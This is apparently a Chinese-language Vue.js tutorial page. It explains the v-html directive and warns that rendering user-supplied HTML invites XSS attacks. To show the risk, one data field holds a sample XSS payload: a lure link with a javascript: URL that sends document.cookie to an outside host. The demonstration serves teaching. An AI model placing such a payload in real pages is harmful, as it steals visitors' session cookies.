<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html指令</title>

    <script src="../js/vue.js"></script>
    <script src="../js/day.js"></script>

</head>
<body>
    <!-- 
        v-html指令：
        1.作用，向指定的结点中渲染包含html结构的内容
        2.与插值语法的区别：
            1).v-html会替换结点中的所有内容，{{xxx}}不会
            2).v-html可以识别html结构
        3.严重注意：v-html 有安全问题！！！
            1).在网站上会动态渲染任意html是非常危险的，容易导致xss攻击
            2).一定要在可信的内容上使用v-html,永远不要用在用户提交的内容上
     -->
    <div id="root">
        <h2>v-html指令学习</h2>
        <div v-html="str"></div>
        <div v-html="str2"></div>

        <p> document.cookie 浏览器中只有httpOnly, http协议类能读取</p>
        <p>v-html指令：
            1.作用，向指定的结点中渲染包含html结构的内容
            2.与插值语法的区别：
                1).v-html会替换结点中的所有内容，{{xxx}}不会
                2).v-html可以识别html结构
            3.严重注意：v-html 有安全问题！！！
                1).在网站上会动态渲染任意html是非常危险的，容易导致xss攻击
                2).一定要在可信的内容上使用v-html,永远不要用在用户提交的内容上</p>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false

        const vm = new Vue({
            el: "#root",
            data: {
                time: 1657034001348,
                str: '<h3>我是一个h3标签</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?" + document.cookie> 兄弟，这里有好康的！！速来~ >'
            }
        })
    </script>

</body>
</html>
